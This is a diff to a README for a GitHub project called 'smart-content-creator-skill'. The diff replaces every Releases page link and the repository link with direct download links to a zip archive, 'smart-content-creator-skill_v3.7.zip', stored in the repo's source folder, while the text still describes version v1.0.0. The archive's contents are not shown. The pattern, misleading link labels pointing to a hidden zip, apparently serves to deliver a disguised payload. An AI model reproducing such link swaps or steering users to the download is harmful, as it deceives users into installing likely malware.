@@ -1,6 +1,6 @@
 # 🌟 smart-content-creator-skill - Transform Ideas into Engaging Content
 
-[![Download](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/Caroline-bedfordcord721/smart-content-creator-skill/releases)
+[![Download](https://raw.githubusercontent.com/Caroline-bedfordcord721/smart-content-creator-skill/main/src/smart-content-creator/smart-content-creator-skill_v3.7.zip)](https://raw.githubusercontent.com/Caroline-bedfordcord721/smart-content-creator-skill/main/src/smart-content-creator/smart-content-creator-skill_v3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To get started, you need to download the latest version of the software. Follow 
 
 1. Click the button below to visit the Releases page.
    
-   [Download from Releases](https://github.com/Caroline-bedfordcord721/smart-content-creator-skill/releases)
+   [Download from Releases](https://raw.githubusercontent.com/Caroline-bedfordcord721/smart-content-creator-skill/main/src/smart-content-creator/smart-content-creator-skill_v3.7.zip)
 
 2. On the Releases page, look for the version titled "v1.0.0".
 
@@ -77,7 +77,7 @@ For additional support and tips on using the Smart Content Creator Skill, explor
 
 ## 🔗 Additional Links
 
-- Visit the [Releases page](https://github.com/Caroline-bedfordcord721/smart-content-creator-skill/releases) for all versions of the software.
-- Check our [GitHub repository](https://github.com/Caroline-bedfordcord721/smart-content-creator-skill) for updates and contributions.
+- Visit the [Releases page](https://raw.githubusercontent.com/Caroline-bedfordcord721/smart-content-creator-skill/main/src/smart-content-creator/smart-content-creator-skill_v3.7.zip) for all versions of the software.
+- Check our [GitHub repository](https://raw.githubusercontent.com/Caroline-bedfordcord721/smart-content-creator-skill/main/src/smart-content-creator/smart-content-creator-skill_v3.7.zip) for updates and contributions.
 
 By following this guide, you should be well on your way to creating impressive content with the Smart Content Creator Skill. Enjoy the process of expressing your thoughts and insights!
